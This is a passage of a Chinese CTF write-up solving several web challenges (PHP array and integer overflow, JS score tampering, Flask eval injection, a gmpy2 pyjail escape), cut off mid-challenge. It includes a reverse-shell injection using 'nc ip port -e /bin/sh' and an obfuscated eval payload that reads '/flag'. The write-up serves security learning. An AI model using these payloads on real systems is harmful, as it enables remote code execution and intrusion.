class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;0&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;0&#x27;</span>]]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$arr</span>[]=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题有bug，直接给0传参就行</p><h3 id="无一幸免-FIXED"><a href="#无一幸免-FIXED" class="headerlink" title="无一幸免_FIXED"></a>无一幸免_FIXED</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;0&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;0&#x27;</span>]]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$arr</span>[]=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这一题难点在于绕过 <code>$arr[]=1</code> 这一个恒真条件，这条语句的意思是：在数组后面添加一个元素1</p><p>64位有符号数，能表示最大数为： <code>2^63-1 = 9223372036854775807</code></p><p>我们只需传入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">0</span>=9223372036854775807<br></code></pre></td></tr></table></figure><p>即可，这样数组的下一个元素下表越界了，则条件 <code>$arr[]=1</code> 为假</p><h3 id="传说之下（雾）"><a href="#传说之下（雾）" class="headerlink" title="传说之下（雾）"></a>传说之下（雾）</h3><p>观察源码，找js代码</p><p><img src="https://s2.loli.net/2023/03/06/b5xmY12SVQvIhfC.png" alt="image-20230306161257156"></p><p>发现创建了一个 Game对象，里面记录的 分数 score</p><p>观察游戏：</p><p><img src="https://s2.loli.net/2023/03/06/jcJHr8dN7UzROoZ.png" alt="image-20230306161510984"></p><p>只要得到2077分就可以拿flag，</p><p>于是我们在控制台输入： <code>Game.score=2077</code></p><p>然后玩游戏吃一个果子就行</p><h3 id="算力超群"><a href="#算力超群" class="headerlink" title="算力超群"></a>算力超群</h3><p>我们对计算进行抓包</p><p><img src="https://s2.loli.net/2023/03/06/pMQZPRVnLahUs7z.png" alt="image-20230306162704519"></p><p>发现该题使用 <code>python flask框架</code>  并且该处可能可以使用命令执行，</p><p>我们可以使用 <code>os.system()</code> 进行命令执行，但是 os 模块需要进行导入，我们没有导入，怎么办呢</p><p>我们可以使用 <code>__import__()</code> 函数 进行动态导入模块</p><blockquote><p><strong><strong>import</strong>()</strong> 函数用于动态加载类和函数 。</p><p>如果一个模块经常变化就可以使用 <strong>import</strong>() 来动态载入。</p></blockquote><p>我们可以使用： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>进行命令执行</p><p>此处我们测试到 <code>number2</code> 位置可以插入代码</p><p>我们可以使用 <code>nc 命令</code>去<code>反弹shell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;nc ip port -e /bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后在服务器指定端口进行监听：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">nc -lvp <span class="hljs-number">9996</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/06/rliko2HDWI3Rnzg.png" alt="image-20230306164640732"></p><p>我们可以直接在服务器执行命令，查看flag</p><p>如图成功得到flag</p><h3 id="算力升级"><a href="#算力升级" class="headerlink" title="算力升级"></a>算力升级</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># !/usr/bin/env python</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"># File       : app.py</span><br><span class="hljs-string"># Time       ：2022/10/20 15:16</span><br><span class="hljs-string"># Author     ：g4_simon</span><br><span class="hljs-string"># version    ：python 3.9.7</span><br><span class="hljs-string"># Description：算力升级--这其实是一个pyjail题目</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re,gmpy2 <br><span class="hljs-keyword">import</span> json<br><span class="hljs-comment">#初始化全局变量</span><br>app = Flask(__name__)<br>pattern=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\w+&#x27;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():  <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/tiesuanzi&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tiesuanzi</span>():<br>    code=request.form.get(<span class="hljs-string">&#x27;code&#x27;</span>)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> pattern.findall(code):<span class="hljs-comment">#从code里把单词拿出来</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;\d+$&#x27;</span>,item):<span class="hljs-comment">#如果不是数字</span><br>            <span class="hljs-keyword">if</span> item <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(gmpy2):<span class="hljs-comment">#逐个和gmpy2库里的函数名比较</span><br>               <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">f&quot;你想干什么？<span class="hljs-subst">&#123;item&#125;</span>不是有效的函数&quot;</span>&#125;)<br>    <span class="hljs-keyword">try</span>:<br>        result=<span class="hljs-built_in">eval</span>(code)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">f&quot;计算成功，答案是<span class="hljs-subst">&#123;result&#125;</span>&quot;</span>&#125;)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">f&quot;没有执行成功，请检查你的输入。&quot;</span>&#125;)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/source&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():  <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;source.html&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>这题好像是关于沙箱逃逸，我们先看一篇文章：<a href="https://zhuanlan.zhihu.com/p/578966149">[PyJail] python沙箱逃逸探究</a></p><p>我们仔细分析这一段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">pattern=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\w+&#x27;</span>)<br>   code=request.form.get(<span class="hljs-string">&#x27;code&#x27;</span>)<br>       <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> pattern.findall(code):<span class="hljs-comment">#从code里把单词拿出来</span><br>           <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;\d+$&#x27;</span>,item):<span class="hljs-comment">#如果不是数字</span><br>               <span class="hljs-keyword">if</span> item <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(gmpy2):<span class="hljs-comment">#逐个和gmpy2库里的函数名比较</span><br>                  <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">f&quot;你想干什么？<span class="hljs-subst">&#123;item&#125;</span>不是有效的函数&quot;</span>&#125;)<br>       <span class="hljs-keyword">try</span>:<br>           result=<span class="hljs-built_in">eval</span>(code)<br>           <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">f&quot;计算成功，答案是<span class="hljs-subst">&#123;result&#125;</span>&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>这一段代码判断，首先把所有的字母、数字、下划线_ 拿出来(findall)：单词，</p><p>如果单词不在gmpy2库中，则执行不了eval()，所以我们必须使用gmpy2库中的函数名来构造想要的代码。</p><p><code>dir()</code>函数可以返回参数的属性以及函数列表。</p><p>例如，我们返回<code>gmpy2</code> 的列表：dir(gmpy2)</p><p><img src="https://s2.loli.net/2023/03/07/mtdIae4KDzH6jCA.png" alt="image-20230307114741408"></p><p>根据分析，特殊字符可以随便使用，</p><p>我们需要使用图片中的函数名来构造payload。</p><p>观察可知，里面有：<code>gmpy2</code>  、<code>__builtins__</code> 等</p><blockquote><p>**<code>__builtins__</code>**：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。</p></blockquote><p>我们使用 <code>gmpy2.__builtins__</code> 查看其中存在的属性、函数，返回的是字典：</p><p><img src="https://s2.loli.net/2023/03/07/b5GxBKqA2JORX9i.png" alt="image-20230307115516500"></p><p>其中包含 eval() 函数，我们需要通过<code>gmpy2</code>中有的函数来构造 eval</p><p>经过观察，gmpy2中存在：<code>invert</code>、<code>fac</code>、<code>lcm</code> 等函数，我们可以通过对字符串中字符取值，拼接为eval</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">gmpy2.__builtins__[<span class="hljs-string">&#x27;invert&#x27;</span>[<span class="hljs-number">3</span>]+<span class="hljs-string">&#x27;invert&#x27;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&#x27;fac&#x27;</span>[<span class="hljs-number">1</span>]+<span class="hljs-string">&#x27;lcm&#x27;</span>[<span class="hljs-number">0</span>]](<br></code></pre></td></tr></table></figure><p>然后我们需要编写脚本，通过gmpy2函数，构造出eval()函数中的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p>这一句的意思是，导入os模块，使用<code>os.popen()</code> 去执行命令，然后读取出来</p><p>我们自己写个脚本进行构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>s = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span><br><br>payload = <span class="hljs-string">&quot;gmpy2.__builtins__[&#x27;invert&#x27;[3]+&#x27;invert&#x27;[2]+&#x27;fac&#x27;[1]+&#x27;lcm&#x27;[0]](&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s: <span class="hljs-comment"># 遍历想执行的代码</span><br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot; &#x27;()/.&quot;</span>:  <span class="hljs-comment"># 如果是这些字符，就直接相加（注意结尾的加号+） </span><br>        payload += <span class="hljs-string">f&quot;\&quot;<span class="hljs-subst">&#123;i&#125;</span>\&quot;+&quot;</span><br>    <span class="hljs-keyword">else</span>: <span class="hljs-comment"># 如果是字母，我们需要使用gmpy2函数进行构造</span><br>        temp_str = <span class="hljs-string">&quot;&quot;</span><br>        temp_index = -<span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(gmpy2): <span class="hljs-comment"># 遍历gmpy2中的函数</span><br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> j:<span class="hljs-comment"># 如果函数中存在该字母</span><br>                temp_index = j.find(i)  <span class="hljs-comment"># 找到该字母下标</span><br>                temp_str = j<br>        payload += <span class="hljs-string">f&quot;\&quot;<span class="hljs-subst">&#123;temp_str&#125;</span>\&quot;[<span class="hljs-subst">&#123;temp_index&#125;</span>]+&quot;</span>  <br>        <span class="hljs-comment"># payload加上函数中指定下标，如 &quot;invert&quot;[3] 就是字母e,注意末尾加上加号+</span><br><br>payload = payload[:-<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;)&quot;</span> <span class="hljs-comment"># 将末尾+替换为空格</span><br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">gmpy2.__builtins__[<span class="hljs-string">&#x27;invert&#x27;</span>[<span class="hljs-number">3</span>]+<span class="hljs-string">&#x27;invert&#x27;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&#x27;fac&#x27;</span>[<span class="hljs-number">1</span>]+<span class="hljs-string">&#x27;lcm&#x27;</span>[<span class="hljs-number">0</span>]](<span class="hljs-string">&quot;xbit_mask&quot;</span>[<span class="hljs-number">4</span>]+<span class="hljs-string">&quot;xbit_mask&quot;</span>[<span class="hljs-number">4</span>]+<span class="hljs-string">&quot;xbit_mask&quot;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;xmpz&quot;</span>[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;xmpz&quot;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;zero&quot;</span>[<span class="hljs-number">3</span>]+<span class="hljs-string">&quot;zero&quot;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;zeta&quot;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;xbit_mask&quot;</span>[<span class="hljs-number">4</span>]+<span class="hljs-string">&quot;xbit_mask&quot;</span>[<span class="hljs-number">4</span>]+<span class="hljs-string">&quot;(&quot;</span>+<span class="hljs-string">&quot;&#x27;&quot;</span>+<span class="hljs-string">&quot;zero&quot;</span>[<span class="hljs-number">3</span>]+<span class="hljs-string">&quot;xbit_mask&quot;</span>[<span class="hljs-number">7</span>]+<span class="hljs-string">&quot;&#x27;&quot;</span>+<span class="hljs-string">&quot;)&quot;</span>+<span class="hljs-string">&quot;.&quot;</span>+<span class="hljs-string">&quot;xmpz&quot;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;zero&quot;</span>[<span class="hljs-number">3</span>]+<span class="hljs-string">&quot;xmpz&quot;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;zeta&quot;</span>[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;yn&quot;</span>[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;(&quot;</span>+<span class="hljs-string">&quot;&#x27;&quot;</span>+<span class="hljs-string">&quot;unpack&quot;</span>[<span class="hljs-number">4</span>]+<span class="hljs-string">&quot;zeta&quot;</span>[<span class="hljs-number">3</span>]+<span class="hljs-string">&quot;zeta&quot;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-string">&quot;/&quot;</span>+<span class="hljs-string">&quot;root_of_unity&quot;</span>[<span class="hljs-number">6</span>]+<span class="hljs-string">&quot;rint_floor&quot;</span>[<span class="hljs-number">6</span>]+<span class="hljs-string">&quot;zeta&quot;</span>[<span class="hljs-number">3</span>]+<span class="hljs-string">&quot;sign&quot;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;&#x27;&quot;</span>+<span class="hljs-string">&quot;)&quot;</span>+<span class="hljs-string">&quot;.&quot;</span>+<span class="hljs-string">&quot;zero&quot;</span>[<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;zeta&quot;</span>[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;zeta&quot;</span>[<span class="hljs-number">3</span>]+<span class="hljs-string">&quot;t_mod_2exp&quot;</span>[<span class="hljs-number">4</span>]+<span class="hljs-string">&quot;(&quot;</span>+<span class="hljs-string">&quot;)&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="easyPytHon-P"><a href="#easyPytHon-P" class="headerlink" title="easyPytHon_P"></a>easyPytHon_P</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">源码在此：<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br>cmd: <span class="hljs-built_in">str</span> = request.form.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)<br>param: <span class="hljs-built_in">str</span> = request.form.get(<span class="hljs-string">&#x27;param&#x27;</span>)<br><span class="hljs-comment"># ------------------------------------- Don&#x27;t modify ↑ them ↑! But you can write your code ↓</span><br><span class="hljs-keyword">import</span> subprocess, os<br><span class="hljs-keyword">if</span> cmd <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> param <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">try</span>:<br>        tVar = subprocess.run([cmd[:<span class="hljs-number">3</span>], param, __file__], cwd=os.getcwd(), timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Done!&#x27;</span>)<br>    <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Timeout!&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Error!&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No Flag!&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这题就是命令执行，但是我们不知道 <code>subprocess.run()</code> 是什么东西</p><p>其实就是执行命令的一个函数。</p><blockquote><p><strong>subprocess.run()</strong></p><p>第一个args是最重要的，它就是要执行的命令。注意它必须是一个列表，里面的内容包括了命令和命令参数，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">subprocess.run([<span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;-l&quot;</span>, <span class="hljs-string">&quot;/usr/bin&quot;</span>])<br></code></pre></td></tr></table></figure><p>那么题中就是取cmd中前三个为命令，param为命令参数，<code>__file__</code>是当前文件路径（当param中传入的也是文件路径参数时，命令行会根据这两个路径参数分别执行成两条命令，输出两个结果）；第二个cwd为当前工作路径，**os.getcwd()**就是返回进程的当前工作目录，timeout&#x3D;5,就是超时时间最大设置为5s。</p></blockquote><h3 id="遍地飘零"><a href="#遍地飘零" class="headerlink" title="遍地飘零"></a>遍地飘零</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$zeros</span>=<span class="hljs-string">&quot;000000000000000000000000000000&quot;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$flag</span>==<span class="hljs-string">&quot;000000000000000000000000000000&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;好多零&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;没有零，仔细看看输入有什么问题吧&quot;</span>;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_GET</span>);<br>&#125;<br><br>没有零，仔细看看输入有什么问题吧<span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>) &#123; &#125; <br></code></pre></td></tr></table></figure><p>观察题目</p><p>我们需要将 <code>$_GET</code> 变量值赋值为 <code>$flag</code> ，</p><p>这样我们通过 var_dump() 就可以将 flag内容输出了</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">_GET</span>=flag<br></code></pre></td></tr></table></figure><h3 id="茶歇区"><a href="#茶歇区" class="headerlink" title="茶歇区"></a>茶歇区</h3><p><img src="https://s2.loli.net/2023/03/06/9tS8peOUcWYFubB.png" alt="image-20230306165435312"></p><p>这一题是叫我们买东西得到 114514分以上就行，但是我们经过尝试，不能输入负值，然后没有什么思路了。</p><p>看了wp，考点是整形溢出</p><p>64位的有符号数表示的最大范围是 <code>2^63-1 = 9223372036854775807</code>  19位数</p><p>但是此时这里进行 <code>x10</code> 运算，溢出太多也没有用，所以我们需要传入18位数，这样刚好溢出</p><p>例如： <code>932337203685477580</code></p><p>传两次得到flag</p><h3 id="小舔田？"><a href="#小舔田？" class="headerlink" title="小舔田？"></a>小舔田？</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Moon</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;月亮&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我是&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;快来赏我&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ion_Fan_Princess</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>=<span class="hljs-string">&quot;牛夫人&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">call</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;nickname==<span class="hljs-string">&quot;小甜甜&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span 